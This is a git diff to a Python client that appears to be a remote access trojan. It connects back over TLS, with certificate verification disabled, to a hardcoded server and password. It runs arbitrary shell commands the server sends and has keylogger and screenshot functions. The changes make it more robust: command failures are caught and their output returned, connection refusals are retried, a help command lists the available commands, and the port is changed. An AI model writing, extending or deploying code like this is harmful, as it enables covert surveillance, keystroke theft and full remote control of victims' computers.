@@ -51,11 +51,12 @@ class App():
         self.context.verify_mode = ssl.CERT_NONE
 
     def run(self):
-        print("client online")
         while self.status != "CLOSED":
             try:
                 sock = socket.create_connection((self.hostname, self.port))
                 self.socket = self.context.wrap_socket(sock, server_hostname=self.hostname)
+                
+                time.sleep(0.05)
                 self.socket.sendall(self.status.encode())
                 data = self.socket.recv(1024).decode()
 
@@ -64,9 +65,9 @@ class App():
                     print("client pinged")
                     self.socket.send(self.id.encode())
                 if data == "SELECTED":
-                    self.socket.sendall(self.password.encode())
+                    self.socket.send(self.password.encode())
                     time.sleep(0.1)
-                    self.socket.sendall(self.id.encode())
+                    self.socket.send(self.id.encode())
                     data = self.socket.recv(1024).decode()
                     if data == "GRANTED":
                         print("client selected")
@@ -98,10 +99,12 @@ class App():
                             except Exception as e:
                                 print(1, e)
 
-                
                 sock.close()
                 self.socket.close()
-
+                
+            except ConnectionRefusedError:
+                pass
+                time.sleep(0.1)
             except Exception as e:
                 print(0, e)
 
@@ -210,7 +213,10 @@ class CMD():
         return screenshot, "SCREENSHOT"
     
     def cmd(self):
-        output = subprocess.check_output(self.command[4:], shell=True, text=True)
+        try:
+            output = subprocess.check_output(self.command[4:], shell=True, text=True)
+        except subprocess.CalledProcessError as e:
+            output = str(e.output)
         return output, "CMD"
     
     def keylogger(self):
@@ -260,7 +266,7 @@ class CMD():
         return "Done", "CLOSE"
     
     def help_(self):
-        pass
+        return list(app.commands.keys()), "HELP"
     
     def on_press(self, key):
         try:
@@ -274,5 +280,5 @@ class CMD():
     
     
 if __name__ == "__main__":
-    app = App("192.168.1.19", 5203, "Id6-DIjjf032_ddo") #server ip address, port(must be same as server), password(must be same as server)
+    app = App("192.168.1.19", 55277, "Id6-DIjjf032_ddo") #server ip address, port(must be same as server), password(must be same as server)
     app.run()
